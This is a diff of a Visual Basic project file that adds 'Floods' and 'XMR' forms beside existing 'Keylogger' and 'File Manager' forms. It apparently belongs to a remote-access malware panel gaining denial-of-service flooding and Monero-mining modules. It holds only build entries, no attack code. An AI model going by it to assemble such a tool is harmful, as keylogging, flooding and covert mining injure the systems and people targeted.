@@ -115,6 +115,12 @@
     <Compile Include="Forms\File Manager.vb">
       <SubType>Form</SubType>
     </Compile>
+    <Compile Include="Forms\Floods.Designer.vb">
+      <DependentUpon>Floods.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\Floods.vb">
+      <SubType>Form</SubType>
+    </Compile>
     <Compile Include="Forms\Intro.Designer.vb">
       <DependentUpon>Intro.vb</DependentUpon>
     </Compile>
@@ -157,6 +163,12 @@
     <Compile Include="Forms\Keylogger.vb">
       <SubType>Form</SubType>
     </Compile>
+    <Compile Include="Forms\XMR.Designer.vb">
+      <DependentUpon>XMR.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\XMR.vb">
+      <SubType>Form</SubType>
+    </Compile>
     <Compile Include="My Project\AssemblyInfo.vb" />
     <Compile Include="My Project\Application.Designer.vb">
       <AutoGen>True</AutoGen>
@@ -180,6 +192,9 @@
     <EmbeddedResource Include="Forms\File Manager.resx">
       <DependentUpon>File Manager.vb</DependentUpon>
     </EmbeddedResource>
+    <EmbeddedResource Include="Forms\Floods.resx">
+      <DependentUpon>Floods.vb</DependentUpon>
+    </EmbeddedResource>
     <EmbeddedResource Include="Forms\Intro.resx">
       <DependentUpon>Intro.vb</DependentUpon>
     </EmbeddedResource>
@@ -201,6 +216,9 @@
     </EmbeddedResource>
     <EmbeddedResource Include="Forms\System Manager.resx">
       <DependentUpon>System Manager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\XMR.resx">
+      <DependentUpon>XMR.vb</DependentUpon>
     </EmbeddedResource>
     <EmbeddedResource Include="My Project\Resources.resx">
       <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
@@ -225,6 +243,7 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="icon.ico" />
+    <None Include="Resources\Guidance.txt" />
     <None Include="Resources\Intro.wav" />
     <None Include="Resources\Error.wav" />
     <None Include="Resources\Lime%27s wallpaper.jpg" />
